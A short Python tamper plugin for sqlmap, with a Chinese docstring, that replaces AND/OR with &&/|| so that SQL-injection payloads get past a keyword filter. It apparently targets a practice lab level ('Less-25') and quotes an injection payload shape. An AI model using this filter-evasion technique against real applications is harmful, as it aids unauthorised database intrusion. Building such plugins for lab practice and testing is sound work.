# -*- coding: utf-8 -*-
"""and2amp：把逻辑运算符 AND/OR 替换为 &&/||。

适用：靶场过滤 AND/OR（Less-25 实测），但 `&&`/`||` 可存活。
配合已确认 payload 的 `1'&&(...)&&'1'='1` 形态，避免 sqlmap 自带的 AND
测试被目标过滤器吃掉，导致误判 "not injectable"。
"""
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL


def dependencies():
    pass


def tamper(payload, **kwargs):
    if not payload:
        return payload
    out = re.sub(r"\bAND\b", "&&", payload, flags=re.I)
    out = re.sub(r"\bOR\b", "||", out, flags=re.I)
    return out
